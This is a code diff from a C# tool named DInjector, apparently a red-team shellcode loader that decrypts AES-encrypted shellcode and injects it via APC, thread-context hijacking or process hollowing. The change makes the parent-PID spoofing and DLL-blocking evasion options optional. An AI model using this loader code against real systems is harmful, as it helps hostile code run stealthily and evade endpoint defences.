@@ -80,6 +80,23 @@ namespace DInjector
             AES ctx = new AES(password);
             var shellcodeBytes = ctx.Decrypt(shellcodeEncrypted);
 
+            var ppid = 0;
+            try
+            {
+                ppid = int.Parse(options["/ppid"]);
+            }
+            catch (Exception)
+            { }
+
+            var blockDlls = false;
+            try
+            {
+                if (bool.Parse(options["/blockDlls"]))
+                    blockDlls = true;
+            }
+            catch (Exception)
+            { }
+
             switch (commandName)
             {
                 case "functionpointer":
@@ -123,22 +140,22 @@ namespace DInjector
                     RemoteThreadAPC.Execute(
                         shellcodeBytes,
                         options["/image"],
-                        int.Parse(options["/ppid"]),
-                        bool.Parse(options["/blockDlls"]));
+                        ppid,
+                        blockDlls);
                     break;
                 case "remotethreadcontext":
                     RemoteThreadContext.Execute(
                         shellcodeBytes,
                         options["/image"],
-                        int.Parse(options["/ppid"]),
-                        bool.Parse(options["/blockDlls"]));
+                        ppid,
+                        blockDlls);
                     break;
                 case "processhollow":
                     ProcessHollow.Execute(
                         shellcodeBytes,
                         options["/image"],
-                        int.Parse(options["/ppid"]),
-                        bool.Parse(options["/blockDlls"]));
+                        ppid,
+                        blockDlls);
                     break;
             }
         }
